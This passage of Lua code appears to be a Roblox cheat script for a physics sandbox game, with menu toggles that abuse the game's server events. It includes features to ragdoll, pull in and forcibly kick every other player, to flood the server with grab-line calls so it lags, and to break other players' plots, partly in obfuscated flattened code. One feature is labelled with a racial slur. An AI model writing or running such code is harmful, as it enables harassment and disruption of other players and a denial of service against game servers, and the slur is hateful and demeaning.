                                    until not tbl2.RagdollAllT or not v48 or v48:FindFirstChild("PartOwner") ~= nil

                                    if not tbl2.RagdollAllT then
                                        break
                                    end
                                    DestroyGrabLine:FireServer(v48)
                                    local attachment = Instance.new("Attachment")
                                    attachment.Parent = v48
                                    local alignPosition = Instance.new("AlignPosition")
                                    v47 = alignPosition
                                    alignPosition.MaxForce = math.huge
                                    alignPosition.MaxVelocity = math.huge
                                    alignPosition.Responsiveness = 200
                                    alignPosition.Parent = v48
                                    alignPosition.Attachment0 = attachment
                                end

                                local flag = true

                                for k, child in pairs(foodBanana:GetChildren()) do
                                    if child:FindFirstChild("PartOwner") ~= nil and child.PartOwner.Value ~= localPlayer.Name then
                                        DestroyToy:FireServer(foodBanana)
                                        foodBanana = nil
                                        flag = false
                                        break
                                    end
                                end

                                if flag and foodBanana then
                                    local alignPosition = v48:FindFirstChild("AlignPosition")
                                    v47 = alignPosition

                                    if alignPosition then
                                        alignPosition.Attachment1 = leftFootAttachment
                                        task.wait(0.3)
                                    else
                                        DestroyToy:FireServer(foodBanana)
                                        foodBanana = nil
                                    end
                                end
                            end
                        end

                        if foodBanana then
                            if v47 then
                                v47:Destroy()
                            end

                            DestroyToy:FireServer(foodBanana)
                        end
                    end)
                else
                    for k, child in pairs(SpawnedInToys:GetChildren()) do
                        if child.Name == "FoodBanana" then
                            DestroyToy:FireServer(child)
                        end
                    end
                end
            end,
        })

        v28:AddToggle("BananaWhite", {
            Text = "Whitelist",
            Default = tbl2.RagdollallWhitelist,
            Callback = function(ragdollallWhitelist)
                tbl2.RagdollallWhitelist = ragdollallWhitelist
            end,
        })

        v29:AddToggle("NiggerT", {
            Text = "Nigger All",
            Default = false,
            Callback = function(niggerAllT)
                tbl2.NiggerAllT = niggerAllT

                if niggerAllT then
                    task.spawn(function()
                        while tbl2.NiggerAllT do
                            fn4("OvenDarkGray", hrp_().CFrame * CFrame.new(0, 3, 4), Vector3.zero)
                            local v46 = obj.Workspace:WaitForChild(localPlayer.Name .. "SpawnedInToys")
                            local ovenDarkGray = v46:WaitForChild("OvenDarkGray", 3)
                            if not ovenDarkGray or not tbl2.NiggerAllT then
                                break
                            end
                            ovenDarkGray.Name = "BurnOvenDarkGray"
                            local buttonOven = ovenDarkGray:FindFirstChild("ButtonOven")

                            if buttonOven then
                                SetNetworkOwner:FireServer(buttonOven, hrp_().CFrame)
                                DestroyGrabLine:FireServer(buttonOven)
                            end

                            task.wait(0.1)

                            if ovenDarkGray:FindFirstChild("SoundPart") then
                                SetNetworkOwner:FireServer(ovenDarkGray.SoundPart, hrp_().CFrame)
                            end

                            while tbl2.NiggerAllT and ovenDarkGray and ovenDarkGray.Parent == v46 do
                                for i, player in ipairs(obj.Players:GetPlayers()) do
                                    if not tbl2.NiggerAllT or not ovenDarkGray or ovenDarkGray.Parent ~= v46 then
                                        break
                                    end

                                    if player ~= localPlayer and not fn10(player) then
                                        local character = player.Character

                                        if character then
                                            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

                                            if humanoidRootPart then
                                                if ovenDarkGray and ovenDarkGray:FindFirstChild("SoundPart") then
                                                    ovenDarkGray.SoundPart.CFrame = humanoidRootPart.CFrame
                                                end

                                                task.wait(0.1)
                                            end
                                        end
                                    end
                                end

                                task.wait(0.05)
                            end

                            if not tbl2.NiggerAllT then
                                if ovenDarkGray and ovenDarkGray.Name == "BurnOvenDarkGray" then
                                    DestroyToy:FireServer(ovenDarkGray)
                                end

                                break
                            end

                            continue
                        end
                    end)
                end
            end,
        })

        v29:AddToggle("NiggerWhite", {
            Text = "Whitelist",
            Default = tbl2.NiggerWhiteList,
            Callback = function(niggerWhiteList)
                tbl2.NiggerWhiteList = niggerWhiteList
            end,
        })

        v30:AddToggle("BR", {
            Text = "Bring All",
            Default = false,
            Callback = function(bringAllToggle)
                tbl2.BringAllToggle = bringAllToggle

                if bringAllToggle then
                    if tbl2.cameraAnchor then
                        local currentCamera = obj.Workspace.CurrentCamera

                        if currentCamera and tbl2.originalCameraSubject then
                            currentCamera.CameraSubject = tbl2.originalCameraSubject
                        end

                        tbl2.cameraAnchor:Destroy()
                        tbl2.cameraAnchor = nil
                        tbl2.originalCameraSubject = nil
                    end

                    coroutine.wrap(function()
                        local v46 = hrp_()
                        local cFrame = v46 and v46.CFrame
                        if not cFrame then
                            return
                        end
                        local cframe = CFrame.lookAt(obj.Workspace.CurrentCamera.CFrame.Position + Vector3.new(-15, 15, 0), cFrame.Position)
                        obj.Workspace.CurrentCamera.CFrame = cframe

                        while tbl2.BringAllToggle do
                            local v47 = hrp_()

                            if v47 then
                                local position = v47.Position
                                local n2 = position + Vector3.new(0, -3, 0)
                                local position2 = position + Vector3.new(0, 3, 0)
                                v47.CFrame = CFrame.new(n2)

                                if not tbl2.freezePart then
                                    tbl2.freezePart = Instance.new("Part")
                                    tbl2.freezePart.Anchored = true
                                    tbl2.freezePart.CanCollide = false
                                    tbl2.freezePart.Transparency = 1
                                    tbl2.freezePart.Size = Vector3.new(1, 1, 1)
                                    tbl2.freezePart.Parent = obj.Workspace
                                end

                                tbl2.freezePart.CFrame = CFrame.new(n2)
                                obj.Workspace.CurrentCamera.CameraType = Enum.CameraType.Follow
                                obj.Workspace.CurrentCamera.CameraSubject = tbl2.freezePart
                                local v48, v49, v50 = ipairs(obj.Players:GetPlayers())
                                local v51 = v50
                                local v52 = v48
                                local v53 = v49

                                while true do
                                    local v54, v55 = v52(v53, v51)
                                    if v54 == nil then
                                        break
                                    end
                                    v51 = v54
                                    local flag = false

                                    if not fn11(v55) and v55.Character then
                                        local humanoid = v55.Character:FindFirstChildOfClass("Humanoid")

                                        if humanoid and humanoid.Health > 0 and not fn6(v55) then
                                            local humanoidRootPart = v55.Character:FindFirstChild("HumanoidRootPart")
                                            local magnitude = humanoidRootPart and humanoidRootPart.Velocity.Magnitude or 0

                                            if magnitude < 20 then
                                                flag = true
                                            end
                                        end
                                    end

                                    if flag then
                                        local humanoidRootPart = v55.Character:FindFirstChild("HumanoidRootPart")
                                        local humanoid = v55.Character:FindFirstChildOfClass("Humanoid")
                                        local ragdolled = humanoid and humanoid:FindFirstChild("Ragdolled")

                                        if humanoidRootPart and humanoid and ragdolled then
                                            local n3 = 0
                                            local v56 = v54
                                            local v57 = v52
                                            local v58 = v53

                                            while true do
                                                local n4 = n3 + 1
                                                if n4 > 50 then
                                                    break
                                                end
                                                n3 = n4
                                                if not tbl2.BringAllToggle then
                                                    break
                                                end

                                                if not tbl2.floatConnection then
                                                    tbl2.floatConnection = obj.RunService.Stepped:Connect(function()
                                                        if tbl2.BringAllToggle and localPlayer.Character then
                                                            for i, descendant in ipairs(localPlayer.Character:GetDescendants()) do
                                                                if descendant:IsA("BasePart") then
                                                                    descendant.CanCollide = false
                                                                end
                                                            end
                                                        end
                                                    end)
                                                end

                                                if humanoidRootPart then
                                                    if not humanoidRootPart:FindFirstChild("PartOwner") or humanoidRootPart.PartOwner.Value ~= localPlayer.Name then
                                                        local v59 = hrp_()

                                                        if SetNetworkOwner and v59 then
                                                            SetNetworkOwner:FireServer(humanoidRootPart, CFrame.lookAt(v59.Position, humanoidRootPart.Position))
                                                        end

                                                        local n5 = 0
                                                        local n6

                                                        repeat
                                                            n6 = n5 + 1
                                                            if n6 > 5 then
                                                                break
                                                            end
                                                            n5 = n6
                                                            task.wait()
                                                        until humanoidRootPart:FindFirstChild("PartOwner") and humanoidRootPart.PartOwner.Value == localPlayer.Name

                                                        n3 = n4
                                                    end
                                                end

                                                if not cnwoshipoPl(v55) then
                                                    task.wait()
                                                    local v59 = hrp_()

                                                    if v59 then
                                                        if humanoidRootPart.Position.Y <= -9 then
                                                            v59.CFrame = CFrame.new(humanoidRootPart.Position + Vector3.new(0, 5, -15))
                                                        else
                                                            v59.CFrame = CFrame.new(humanoidRootPart.Position + Vector3.new(0, 5, 5))
                                                        end
                                                    end

                                                    continue
                                                end

                                                if not ragdolled.Value and v55:DistanceFromCharacter(position) > 10 then
                                                    humanoidRootPart.CFrame = CFrame.new(position2)
                                                end

                                                local bringBody = humanoidRootPart:FindFirstChild("BringBody")
                                                local v59 = bringBody

                                                if not bringBody then
                                                    local bodyPosition = Instance.new("BodyPosition")
                                                    v59 = bodyPosition
                                                    bodyPosition.Name = "BringBody"
                                                    bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                                    bodyPosition.D = 5000
                                                    bodyPosition.P = 1500000
                                                    bodyPosition.Parent = humanoidRootPart
                                                end

                                                v59.Position = position2
                                                break
                                            end

                                            v51 = v56
                                            v52 = v57
                                            v53 = v58
                                        end
                                    end
                                end

                                local v54 = hrp_()

                                if v54 then
                                    v54.CFrame = CFrame.new(n2)
                                end
                            else
                                task.wait()
                            end

                            task.wait()
                        end

                        local character = localPlayer.Character
                        local humanoid = character and localPlayer.Character:FindFirstChildOfClass("Humanoid")

                        if humanoid then
                            obj.Workspace.CurrentCamera.CameraSubject = humanoid
                        end

                        obj.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom

                        if tbl2.floatConnection then
                            tbl2.floatConnection:Disconnect()
                            tbl2.floatConnection = nil
                        end

                        local v47 = hrp_()

                        if v47 then
                            v47.CFrame = cFrame
                        end
                    end)()
                else
                    local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")

                    if humanoid then
                        obj.Workspace.CurrentCamera.CameraSubject = humanoid
                    end

                    obj.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom

                    if tbl2.floatConnection then
                        tbl2.floatConnection:Disconnect()
                        tbl2.floatConnection = nil
                    end
                end
            end,
        })

        v30:AddToggle("BRWhite", {
            Text = "WhiteList",
            Default = tbl2.gewgsgvwe,
            Callback = function(gewgsgvwe)
                tbl2.gewgsgvwe = gewgsgvwe
            end,
        })

        v31:AddToggle("LineLagT", {
            Text = "Line Lag server",
            Default = false,
            Callback = function(arg)
                if arg then
                    if tbl2.LineLagToggle then
                        return
                    end
                    tbl2.LineLagToggle = true

                    tbl2.LineLagCoro = coroutine.create(function()
                        if not CreateGrabLine then
                            return
                        end

                        while tbl2.LineLagToggle do
                            local spawnLocation = obj.Workspace:FindFirstChild("SpawnLocation")
                            local spawn = spawnLocation or obj.Workspace:FindFirstChild("Spawn")

                            if not spawn then
                                local character = localPlayer.Character
                                spawn = character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                            end

                            if spawn then
                                local n2 = math.random(-1000000000, 1000000000)
                                local n3 = math.random(-1000000000, 1000000000)

                                local tbl11 = {
                                    CFrame.new(n2, 0, n3),
                                    CFrame.new(-n2, 0, -n3),
                                    CFrame.new(n2, 0, -n3),
                                    CFrame.new(-n2, 0, n3),
                                }

                                for k, v46 in pairs(tbl11) do
                                    CreateGrabLine:FireServer(spawn, v46)
                                end
                            end

                            task.wait()
                        end
                    end)

                    coroutine.resume(tbl2.LineLagCoro)
                else
                    tbl2.LineLagToggle = false

                    if tbl2.LineLagCoro then
                        coroutine.close(tbl2.LineLagCoro)
                        tbl2.LineLagCoro = nil
                    end
                end
            end,
        })

        v31:AddToggle("Crazy", {
            Text = "Crazy Line",
            Default = false,
            Callback = function(crazyLineLag)
                tbl2.CrazyLineLag = crazyLineLag

                if crazyLineLag then
                    task.spawn(function()
                        while tbl2.CrazyLineLag do
                            for k, player in pairs(obj.Players:GetPlayers()) do
                                if not tbl2.CrazyLineLag then
                                    break
                                end

                                if player ~= localPlayer and player.Character then
                                    local torso = player.Character:FindFirstChild("Torso")

                                    if torso then
                                        CreateGrabLine:FireServer(torso, CFrame.new(0.12640380859375, 0.9606337547302246, -0.5000009536743164, 0.9985212683677673, 0, -0.05436277016997337, -6.4805472099749295e-09, 1, -1.1903301100346653e-07, 0.05436277016997337, 5.960464477539063e-08, 0.9985212683677673))
                                    end
                                end
                            end

                            task.wait()
                        end
                    end)
                end
            end,
        })

        v32:AddButton({
            Text = "Ground kick",
            Func = function()
                local humanoidRootPart

                if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    humanoidRootPart = localPlayer.Character.HumanoidRootPart
                else
                    humanoidRootPart = localPlayer.CharacterAdded:Wait():WaitForChild("HumanoidRootPart")
                end

                if not humanoidRootPart then
                    return
                end
                local v46 = nil

                if workspace.PlotItems.PlayersInPlots:FindFirstChild(localPlayer.Name) then
                    local v47, v48, v49 = pairs(workspace.Plots:GetChildren())
                    local v50 = v49
                    local v51 = v47
                    local v52 = v48
                    local v53, v54, plotSign, thisPlotsOwners, v55

                    repeat
                        v53, v54 = v51(v52, v50)
                        if v53 == nil then
                            break
                        end
                        v50 = v53
                        plotSign = v54:FindFirstChild("PlotSign")
                        thisPlotsOwners = plotSign and plotSign:FindFirstChild("ThisPlotsOwners")

                        if thisPlotsOwners then
                            for k, child in pairs(thisPlotsOwners:GetChildren()) do
                                if child.Value == localPlayer.Name then
                                    v55 = workspace.PlotItems:FindFirstChild(v54.Name)
                                    if v55 then
                                        v46 = v55
                                        break
                                    end
                                    continue
                                end
                            end

                            v50 = v53
                        end
                    until v46
                else
                    v46 = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                end

                if not v46 then
                    v46 = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                end

                if not v46 then
                    return
                end
                local raycastParams = RaycastParams.new()
                raycastParams.FilterDescendantsInstances = {localPlayer.Character}
                raycastParams.FilterType = Enum.RaycastFilterType.Exclude
                local hit = workspace:Raycast(humanoidRootPart.Position, Vector3.new(0, -15, 0), raycastParams)
                local instance = hit and hit.Instance
                if not instance or not instance:IsA("BasePart") or instance:IsA("Terrain") then
                    return
                end

                if not localPlayer:WaitForChild("CanSpawnToy").Value or not SpawnToyRemoteFunction then
                    return
                end
                local tbl11 = {}

                for k, child in pairs(v46:GetChildren()) do
                    if child.Name == "NinjaShuriken" then
                        table.insert(tbl11, child)
                    end
                end

                local ok, result = pcall(function()
                    SpawnToyRemoteFunction:InvokeServer("NinjaShuriken", humanoidRootPart.CFrame * CFrame.new(0, 2, 8), Vector3.new(0, 0, 0))
                    local now2 = tick()

                    while tick() - now2 < 2 do
                        for k, child in pairs(v46:GetChildren()) do
                            if child.Name == "NinjaShuriken" and not table.find(tbl11, child) then
                                return child
                            end
                        end

                        task.wait()
                    end

                    return nil
                end)

                if not ok or not result then
                    return
                end
                local soundPart = result:FindFirstChild("SoundPart")
                local soundPart2 = soundPart or result:WaitForChild("SoundPart", 0.1)

                if soundPart2 and SetNetworkOwner then
                    pcall(function()
                        SetNetworkOwner:FireServer(soundPart2, soundPart2.CFrame)
                    end)
                end

                if result:FindFirstChild("StickyPart") and StickyPartEvent then
                    pcall(function()
                        StickyPartEvent:FireServer(result.StickyPart, instance, CFrame.new(0, -2300000000, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
                    end)
                end
            end,
        })

        v33:AddButton({
            Text = "Kick All (Blob)",
            Callback = function()
                task.spawn(function()
                    local tbl11 = {}

                    for i, player in ipairs(obj.Players:GetPlayers()) do
                        if isTargetable(player) then
                            table.insert(tbl11, player)
                        end
                    end

                    if #tbl11 == 0 then
                        return
                    end

                    if not tbl2.lineLagConkickall then
                        tbl2.lineLagConkickall = true

                        tbl2.lineLagkickall = coroutine.create(function()
                            while tbl2.lineLagConkickall do
                                local spawnLocation = obj.Workspace:FindFirstChild("SpawnLocation")
                                local spawn = spawnLocation or obj.Workspace:FindFirstChild("Spawn")

                                if not spawn then
                                    local character = localPlayer.Character
                                    spawn = character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                                end

                                if spawn then
                                    local n2 = math.random(-2000000000, 2000000000)
                                    local n3 = math.random(-2000000000, 2000000000)

                                    local tbl12 = {
                                        CFrame.new(n2, 0, n3),
                                        CFrame.new(-n2, 0, -n3),
                                        CFrame.new(n2, 0, -n3),
                                        CFrame.new(-n2, 0, n3),
                                    }

                                    for k, v46 in pairs(tbl12) do
                                        pcall(function()
                                            CreateGrabLine:FireServer(spawn, v46)
                                        end)
                                    end
                                end

                                task.wait()
                            end
                        end)

                        coroutine.resume(tbl2.lineLagkickall)
                    end

                    local tbl12 = {}

                    for i, v46 in ipairs(tbl11) do
                        tbl12[v46.UserId] = "Targeting"
                    end

                    local character = localPlayer.Character
                    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

                    if not humanoidRootPart then
                        tbl2.lineLagConkickall = false

                        if tbl2.lineLagkickall then
                            coroutine.close(tbl2.lineLagkickall)
                            tbl2.lineLagkickall = nil
                        end

                        return
                    end

                    local position = humanoidRootPart.Position
                    local n2 = position.Y + tbl2.KickallHeight
                    local n3 = humanoidRootPart.CFrame * CFrame.new(0, 0, -5)

                    pcall(function()
                        SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", n3, Vector3.new(0, 127, 0))
                    end)

                    task.wait(0.8)
                    local v46 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                    local creatureBlobman = v46 and v46:FindFirstChild("CreatureBlobman")

                    if not creatureBlobman then
                        tbl2.lineLagConkickall = false

                        if tbl2.lineLagkickall then
                            coroutine.close(tbl2.lineLagkickall)
                            tbl2.lineLagkickall = nil
                        end

                        return
                    end

                    local vehicleSeat = creatureBlobman:FindFirstChild("VehicleSeat")

                    if vehicleSeat and localPlayer.Character then
                        pcall(function()
                            vehicleSeat:Sit(localPlayer.Character:FindFirstChildOfClass("Humanoid"))
                        end)
                    end

                    task.wait(0.6)

                    if not humanoidRootPart then
                        tbl2.lineLagConkickall = false

                        if tbl2.lineLagkickall then
                            coroutine.close(tbl2.lineLagkickall)
                            tbl2.lineLagkickall = nil
                        end

                        return
                    end

                    local v47, v48, v49 = ipairs(tbl11)
                    local v50 = v49
                    local v51 = v47
                    local v52 = v48

                    while true do
                        local v53, v54 = v51(v52, v50)
                        if v53 == nil then
                            break
                        end
                        v50 = v53
                        local character2 = v54.Character
                        local humanoidRootPart2 = character2 and v54.Character:FindFirstChild("HumanoidRootPart")

                        if humanoidRootPart2 then
                            humanoidRootPart.CFrame = humanoidRootPart2.CFrame
                            task.wait(0.03)

                            for i = 1, 3 do
                                pcall(function()
                                    creatureBlobman.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(creatureBlobman.LeftDetector, humanoidRootPart2, creatureBlobman.LeftDetector.LeftWeld)
                                    task.wait(0.02)
                                    creatureBlobman.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(creatureBlobman.LeftDetector.LeftWeld)
                                    creatureBlobman.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(creatureBlobman.RightDetector, humanoidRootPart2, creatureBlobman.RightDetector.RightWeld)
                                    task.wait(0.02)
                                    creatureBlobman.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(creatureBlobman.RightDetector.RightWeld)
                                end)

                                task.wait(0.03)
                            end

                            v50 = v53
                        end
                    end

                    humanoidRootPart.CFrame = CFrame.new(position.X, n2 + 10, position.Z)
                    task.wait(0.1)
                    local kickallRadius = tbl2.kickallRadius
                    local x = position.X
                    local z = position.Z
                    local n4 = math.pi * 2 / #tbl11

                    for i, v53 in ipairs(tbl11) do
                        local character2 = v53.Character
                        local humanoidRootPart2 = character2 and v53.Character:FindFirstChild("HumanoidRootPart")

                        if humanoidRootPart2 then
                            local n5 = (i - 1) * n4 + math.random(-0.05, 0.05)
                            local n6 = kickallRadius + math.random(-0.3, 0.3)
                            local n7 = x + n6 * math.cos(n5)
                            local n8 = z + n6 * math.sin(n5)
                            local n9 = n2 + math.random() * 0.3
                            humanoidRootPart2.CFrame = CFrame.new(n7, n9, n8)
                            humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
                            humanoidRootPart2.AssemblyAngularVelocity = Vector3.zero
                            local bodyPosition = Instance.new("BodyPosition")
                            bodyPosition.MaxForce = Vector3.new(1000000000, 1000000000, 1000000000)
                            bodyPosition.P = 40000000
                            bodyPosition.Position = Vector3.new(n7, n9, n8)
                            bodyPosition.Parent = humanoidRootPart2

                            task.delay(1.5, function()
                                pcall(function()
                                    bodyPosition:Destroy()
                                end)
                            end)

                            task.wait(0.02)
                        end
                    end

                    task.wait(0.1)

                    for i = 1, 2 do
                        for i2, v53 in ipairs(tbl11) do
                            local character2 = v53.Character
                            local humanoidRootPart2 = character2 and v53.Character:FindFirstChild("HumanoidRootPart")

                            if humanoidRootPart2 then
                                task.spawn(function()
                                    pcall(function()
                                        SetNetworkOwner:FireServer(humanoidRootPart2, CFrame.new(humanoidRootPart2.Position))
                                        DestroyGrabLine:FireServer(humanoidRootPart2)
                                        CreateGrabLine:FireServer(humanoidRootPart2, CFrame.new(0, 1000000000, 0))
                                    end)
                                end)
                            end
                        end

                        task.wait(0.05)
                    end

                    task.wait(0.1)

                    for i = 1, 2 do
                        for i2, v53 in ipairs(tbl11) do
                            local character2 = v53.Character
                            local humanoidRootPart2 = character2 and v53.Character:FindFirstChild("HumanoidRootPart")

                            if humanoidRootPart2 then
                                task.spawn(function()
                                    pcall(function()
                                        creatureBlobman.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(creatureBlobman.LeftDetector, humanoidRootPart2, creatureBlobman.LeftDetector.LeftWeld)
                                        task.wait(0.02)
                                        creatureBlobman.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(creatureBlobman.RightDetector, humanoidRootPart2, creatureBlobman.RightDetector.RightWeld)
                                        task.wait(0.02)
                                        creatureBlobman.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(creatureBlobman.LeftDetector, humanoidRootPart2, creatureBlobman.LeftDetector.LeftWeld)
                                        creatureBlobman.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(creatureBlobman.RightDetector, humanoidRootPart2, creatureBlobman.RightDetector.RightWeld)
                                    end)
                                end)
                            end
                        end

                        task.wait(0.05)
                    end

                    task.wait(0.1)

                    for i, v53 in ipairs(tbl11) do
                        if v53 and v53.Parent == obj.Players then
                            tbl12[v53.UserId] = "Kicked"
                        end
                    end

                    humanoidRootPart.CFrame = CFrame.new(position.X, position.Y - 5, position.Z)

                    for i, descendant in ipairs(creatureBlobman:GetDescendants()) do
                        if descendant:IsA("BasePart") then
                            pcall(function()
                                descendant.Anchored = false
                            end)
                        end
                    end

                    task.wait(0.5)
                    tbl2.lineLagConkickall = false

                    if tbl2.lineLagkickall then
                        coroutine.close(tbl2.lineLagkickall)
                        tbl2.lineLagkickall = nil
                    end
                end)
            end,
        })

        v33:AddToggle("WhitelistKickall", {
            Text = "Whitelist Friends",
            Default = false,
            Callback = function(whitelistKickall)
                tbl2.WhitelistKickall = whitelistKickall
            end,
        })

        v33:AddButton({
            Text = "Stop Lag",
            Callback = function()
                tbl2.lineLagConkickall = false

                if tbl2.lineLagkickall then
                    pcall(function()
                        coroutine.close(tbl2.lineLagkickall)
                    end)

                    tbl2.lineLagkickall = nil
                end
            end,
        })

        v34:AddDropdownEx("PlotSelect", {
            Text = "Select Plot (Break Plot Area)",
            Default = tbl2.SelectedPlot,
            Multi = true,
            Values = {
                {Name = "Purple-Plot", Image = "rbxassetid://9909725942"},
                {Name = "Red-Plot", Image = "rbxassetid://8989326312"},
                {Name = "Green-Plot", Image = "rbxassetid://8989327148"},
                {Name = "Blue-Plot", Image = "rbxassetid://9909733734"},
                {Name = "Chinese-Plot", Image = "rbxassetid://9108988013"},
            },
            Callback = function(arg)
                tbl2.SelectBleakPlot = {}

                for k, v46 in pairs(arg) do
                    local name = type(v46) == "table" and v46.Name or v46
                    local v47 = PLOT_MAP[name]
                    local v48 = v47 or name
                    table.insert(tbl2.SelectBleakPlot, v48)
                end
            end,
        })

        v34:AddToggle("PlotBreakt", {
            Text = "Plot Break",
            Default = false,
            Callback = function(plotBreakToggle)
                tbl2.plotBreakToggle = plotBreakToggle

                if tbl2.plotBreakToggle then
                    task.spawn(function()
                        local tbl11, v46, v47, v48, v49, v50, v51, v52, plotArea, v53, v54, v55, v56, v57, v58, v59, v60, v61, plotSign, thisPlotsOwners
                        local v62, v63, v64, v65, v66, v67, v68, v69, v70, bleakPlotShuriken, v71, v72, v73, v74, v75, v76, n2, n3, n4, n5
                        local v77, v78, area, canSpawnToy2, humanoidRootPart, v79, humanoidRootPart2, tbl12, v80, v81, v82, v83, v84, v85, ok, result, soundPart, soundPart2, n6, n7
                        local v86, v87, v88, v89, v90, v91, n8
                        n8 = 1

                        while true do
                            if n8 == 1 then
                                if tbl2.plotBreakToggle then
                                    n8 = 2
                                else
                                    n8 = 63
                                end
                            elseif n8 == 2 then
                                tbl11 = {}
                                v46, v47, v48 = pairs(tbl2.SelectBleakPlot)
                                v49 = v48
                                n8 = 3
                            elseif n8 == 3 then
                                v50, v51 = v46(v47, v49)

                                if v50 == nil then
                                    n8 = 8
                                else
                                    n8 = 4
                                end
                            elseif n8 == 4 then
                                v49 = v50
                                v52 = workspace.Plots:FindFirstChild(v51)
                                plotArea = v52

                                if v52 then
                                    n8 = 5
                                else
                                    n8 = 6
                                end
                            elseif n8 == 5 then
                                plotArea = v52:FindFirstChild("PlotArea")
                                n8 = 6
                            elseif n8 == 6 then
                                if plotArea then
                                    n8 = 7
                                else
                                    n8 = 3
                                end
                            elseif n8 == 7 then
                                table.insert(tbl11, {Name = v51, Area = plotArea})
                                n8 = 3
                            elseif n8 == 8 then
                                if #tbl11 == 0 then
                                    n8 = 62
                                else
                                    n8 = 9
                                end
                            elseif n8 == 9 then
                                v53 = nil

                                if PlotItems.PlayersInPlots:FindFirstChild(localPlayer.Name) then
                                    n8 = 10
                                else
                                    n8 = 24
                                end
                            elseif n8 == 10 then
                                v54, v55, v56 = pairs(workspace.Plots:GetChildren())
                                v57 = v56
                                v58 = v54
                                v59 = v55
                                n8 = 11
                            elseif n8 == 11 then
                                v60, v61 = v58(v59, v57)

                                if v60 == nil then
                                    n8 = 22
                                else
                                    n8 = 12
                                end
                            elseif n8 == 12 then
                                v57 = v60
                                plotSign = v61:FindFirstChild("PlotSign")
                                thisPlotsOwners = plotSign

                                if plotSign then
                                    n8 = 13
                                else
                                    n8 = 14
                                end
                            elseif n8 == 13 then
                                thisPlotsOwners = plotSign:FindFirstChild("ThisPlotsOwners")
                                n8 = 14
                            elseif n8 == 14 then
                                if thisPlotsOwners then
                                    n8 = 15
                                else
                                    n8 = 21
                                end
                            elseif n8 == 15 then
                                v62, v63, v64 = pairs(thisPlotsOwners:GetChildren())
                                v65 = v58
                                v66 = v59
                                v67 = v64
                                n8 = 16
                            elseif n8 == 16 then
                                v68, v69 = v62(v63, v67)

                                if v68 == nil then
                                    n8 = 20
                                else
                                    n8 = 17
                                end
                            elseif n8 == 17 then
                                v67 = v68

                                if v69.Value == localPlayer.Name then
                                    n8 = 18
                                else
                                    n8 = 16
                                end
                            elseif n8 == 18 then
                                v70 = workspace.PlotItems:FindFirstChild(v61.Name)

                                if v70 then
                                    n8 = 19
                                else
                                    n8 = 16
                                end
                            elseif n8 == 19 then
                                v53 = v70
                                n8 = 20
                            elseif n8 == 20 then
                                v57 = v60
                                v58 = v65
                                v59 = v66
                                n8 = 21
                            elseif n8 == 21 then
                                if v53 then
                                    n8 = 22
                                else
                                    n8 = 11
                                end
                            elseif n8 == 22 then
                                if v53 then
                                    n8 = 25
                                else
                                    n8 = 23
                                end
                            elseif n8 == 23 then
                                v53 = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                                n8 = 25
                            elseif n8 == 24 then
                                v53 = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                                n8 = 25
                            elseif n8 == 25 then
                                if v53 then
                                    n8 = 26
                                else
                                    n8 = 61
                                end
                            elseif n8 == 26 then
                                bleakPlotShuriken = {}
                                v71, v72, v73 = pairs(tbl2.BleakPlotShuriken)
                                v74 = v73
                                n8 = 27
                            elseif n8 == 27 then
                                v75, v76 = v71(v72, v74)

                                if v75 == nil then
                                    n8 = 30
                                else
                                    n8 = 28
                                end
                            elseif n8 == 28 then
                                v74 = v75

                                if v76 and v76.Parent then
                                    n8 = 29
                                else
                                    n8 = 27
                                end
                            elseif n8 == 29 then
                                table.insert(bleakPlotShuriken, v76)
                                n8 = 27
                            elseif n8 == 30 then
                                tbl2.BleakPlotShuriken = bleakPlotShuriken
                                n2 = #tbl11 - #tbl2.BleakPlotShuriken

                                if n2 > 0 then
                                    n8 = 31
                                else
                                    n8 = 57
                                end
                            elseif n8 == 31 then
                                n3 = 0
                                n4 = n2 + 0
                                n8 = 32
                            elseif n8 == 32 then
                                n5 = n3 + 1

                                if n5 <= n4 then
                                    n8 = 33
                                else
                                    n8 = 57
                                end
                            elseif n8 == 33 then
                                n3 = n5

                                if tbl2.plotBreakToggle then
                                    n8 = 34
                                else
                                    n8 = 57
                                end
                            elseif n8 == 34 then
                                v77 = tbl11[#tbl2.BleakPlotShuriken + 1]

                                if v77 then
                                    n8 = 35
                                else
                                    n8 = 57
                                end
                            elseif n8 == 35 then
                                v78 = nil
                                area = v77.Area

                                if area and v53 then
                                    n8 = 36
                                else
                                    n8 = 54
                                end
                            elseif n8 == 36 then
                                canSpawnToy2 = localPlayer:WaitForChild("CanSpawnToy")

                                if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                    n8 = 40
                                else
                                    n8 = 37
                                end
                            elseif n8 == 37 then
                                v79 = getCharacter()
                                humanoidRootPart2 = v79

                                if v79 then
                                    n8 = 38
                                else
                                    n8 = 39
                                end
                            elseif n8 == 38 then
                                humanoidRootPart2 = v79:WaitForChild("HumanoidRootPart")
                                n8 = 39
                            elseif n8 == 39 then
                                humanoidRootPart = humanoidRootPart2
                                n8 = 41
                            elseif n8 == 40 then
                                humanoidRootPart = localPlayer.Character.HumanoidRootPart
                                n8 = 41
                            elseif n8 == 41 then
                                if humanoidRootPart and canSpawnToy2.Value then
